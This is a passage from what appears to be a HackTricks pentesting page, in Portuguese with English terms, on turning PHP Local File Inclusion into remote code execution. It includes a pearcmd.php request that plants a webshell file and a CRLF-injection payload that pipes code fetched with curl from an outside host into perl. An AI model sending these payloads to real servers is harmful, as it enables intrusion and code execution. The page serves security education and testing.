GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
O seguinte abusa de uma vuln CRLF para obter RCE (de [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Via phpinfo() (file_uploads = on)

Se você encontrou um **Local File Inclusion** e um arquivo expondo **phpinfo()** com file_uploads = on você pode obter RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Via compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Se você encontrou um **Local File Inclusion** e você **can exfiltrate the path** do arquivo temporário, mas o **server** está **checking** se o **file to be included has PHP marks**, você pode tentar **bypass that check** com esta **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Via eternal waiting + bruteforce

Se você consegue abusar do LFI para **upload temporary files** e fazer o **server** **hang** a execução do PHP, você então poderia **brute force filenames durante horas** para encontrar o arquivo temporário:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### To Fatal Error

Se você incluir qualquer um dos arquivos `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Você precisa incluir o mesmo duas vezes para provocar esse erro).

**Não sei como isso é útil, mas pode ser.**\
_Mesmo que você cause um PHP Fatal Error, os arquivos temporários do PHP enviados são deletados._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## Referências

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
